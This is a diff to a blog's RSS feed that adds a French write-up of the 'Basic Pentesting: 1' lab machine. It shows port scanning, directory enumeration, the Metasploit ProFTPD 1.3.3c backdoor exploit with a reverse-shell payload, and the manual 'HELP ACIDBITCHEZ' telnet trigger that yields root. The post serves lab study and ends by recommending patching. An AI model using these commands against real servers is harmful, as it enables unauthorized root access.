@@ -6,8 +6,78 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Thu, 09 Jul 2020 17:06:50 +0200</lastBuildDate>
+        <lastBuildDate>Fri, 10 Jul 2020 13:38:24 +0200</lastBuildDate>
         <atom:link href="https://blog.hugoblanc.com/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Write-up | Basic Pentesting: 1</title>
+            <link>https://blog.hugoblanc.com/posts/basic-pentesting-1-writeup/</link>
+            <pubDate>Fri, 10 Jul 2020 13:38:24 +0200</pubDate>
+            
+            <guid>https://blog.hugoblanc.com/posts/basic-pentesting-1-writeup/</guid>
+            <description>Ce write-up est dédié à la box basic_pentesting_1. J&amp;rsquo;ai récupéré le .ova sur VulnHub, mais elle est également accessible sur Root Me.
+Reconnaissance Scan des ports :
+$ nmap -sV -sC 192.168.1.111 -oN scans/ports.txt ... PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.3c 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d6:01:90:39:2d:8f:46:fb:03:86:73:b3:3c:54:7e:54 (RSA) | 256 f1:f3:c0:dd:ba:a4:85:f7:13:9a:da:3a:bb:4d:93:04 (ECDSA) |_ 256 12:e2:98:d2:a3:e7:36:4f:be:6b:ce:36:6b:7e:0d:9e (ED25519) 80/tcp open http Apache httpd 2.</description>
+            <content type="html"><![CDATA[<p>Ce write-up est dédié à la box basic_pentesting_1. J&rsquo;ai récupéré le .ova sur <a href="https://www.vulnhub.com/">VulnHub</a>, mais elle est également accessible sur <a href="https://www.root-me.org/">Root Me</a>.</p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>Scan des ports :</p>
+<pre><code>$ nmap -sV -sC 192.168.1.111 -oN scans/ports.txt
+...
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD 1.3.3c
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d6:01:90:39:2d:8f:46:fb:03:86:73:b3:3c:54:7e:54 (RSA)
+|   256 f1:f3:c0:dd:ba:a4:85:f7:13:9a:da:3a:bb:4d:93:04 (ECDSA)
+|_  256 12:e2:98:d2:a3:e7:36:4f:be:6b:ce:36:6b:7e:0d:9e (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Nous avons donc un port SSH ouvert, un port FTP ainsi qu&rsquo;un serveur web Apache.
+Énumération du serveur :</p>
+<pre><code>$ gobuster dir -u 192.168.1.111 -w /usr/share/wordlists/dirb/big.txt -o scans/dirs.txt
+...
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/secret (Status: 301)
+/server-status (Status: 403)
+</code></pre><p>Super, un lien secret ! Il contient un blog WordPress vide.
+Lors du scan des ports, j&rsquo;ai remarqué que la version de ProFTPD est la 1.3.3c. Je la connais car elle possède une vulnérabilité assez sévère : une backdoor. De plus, il existe un module <code>msf</code> pour l&rsquo;exploiter.</p>
+<h2 id="exploitation">Exploitation</h2>
+<pre><code>msf5 &gt; use exploit/unix/ftp/proftpd_133c_backdoor
+msf5 exploit(unix/ftp/proftpd_133c_backdoor) &gt; set rhost 192.168.1.111
+rhost =&gt; 192.168.1.111
+msf5 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show payloads
+msf5 exploit(unix/ftp/proftpd_133c_backdoor) &gt; set payload cmd/unix/reverse
+payload =&gt; cmd/unix/reverse
+msf5 exploit(unix/ftp/proftpd_133c_backdoor) &gt; set lhost 192.168.1.209
+lhost =&gt; 192.168.1.209
+msf5 exploit(unix/ftp/proftpd_133c_backdoor) &gt; exploit
+</code></pre><p>C&rsquo;est quand même magique <code>msf</code> :)</p>
+<p>L&rsquo;inferface ouverte est quand même sacrément moche, du coup je fais spawn un shell en <code>python</code> :</p>
+<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'
+# whoami
+whoami
+root
+</code></pre><p>:)</p>
+<h2 id="proftpd-133c">ProFTPD 1.3.3c</h2>
+<p>Pourquoi ce service est vulnérable ?</p>
+<p>En novembre 2010, le serveur principal du projet ProFTPD a été compromis. Les attaquants ont probablement utilisé une faille de sécurité non-patchée dans le démon FTP sur serveur pour gagner l&rsquo;accès. Ils ont ensuite remplacé les fichiers source de ProFTPD 1.3.3c par une version qui contient une backdoor.</p>
+<p>La modification a été remarquée quelques jours après et a été relayée aux équipes ProFTPD qui l&rsquo;ont patché rapidement.</p>
+<p>Comme on a pu le voir au fil de write-up, cette backdoor donne un accès root, c&rsquo;est donc peu banal comme vulnérabilité.</p>
+<p>Pour tester si un service est vulnérable, effectuer une connection <code>telnet</code> sur le port 21 du serveur et envoyer une commande spécifique suffit :</p>
+<pre><code>$ telnet 192.168.1.111 21
+Trying 192.168.1.111...
+Connected to 192.168.1.111.
+Escape character is '^]'.
+220 ProFTPD 1.3.3c Server (vtcsec) [192.168.1.111]
+HELP ACIDBITCHEZ
+id;
+uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
+</code></pre><p>Bien évidemment, la solution la plus efficace face à cette faille est la mise à jour :)</p>
+]]></content>
+        </item>
         
         <item>
             <title>Write-up | Source</title>
